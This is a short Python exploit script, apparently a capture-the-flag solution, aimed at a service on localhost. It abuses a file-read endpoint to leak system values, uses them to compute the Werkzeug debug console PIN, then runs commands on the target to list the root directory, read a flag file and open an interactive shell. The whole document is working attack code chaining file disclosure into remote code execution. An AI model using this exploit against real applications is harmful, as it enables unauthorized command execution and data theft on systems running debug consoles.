from wconsole_extractor import WConsoleExtractor
import requests
import re

url = 'http://localhost:1337'

def leak_function(filename) -> str:
    r = requests.post(f'{url}/get_file', data={'filename': filename})
    if r.status_code == 200:
        return r.text
    else:
        return ''

extractor = WConsoleExtractor(
    target=url,
    leak_function=leak_function
)

print(f'probably public bits: {extractor.probably_public_bits}')
print(f'private bits: {extractor.private_bits}')

print(f'PIN CODE: {extractor.pin_code}')
ls_output = extractor.exec_cmd('ls /')
flag_file = re.search(r'flag-\w+.txt', ls_output).group(0)
flag = extractor.exec_cmd(f'cat /{flag_file}')
print(f'Flag: {flag}')
extractor.shell()
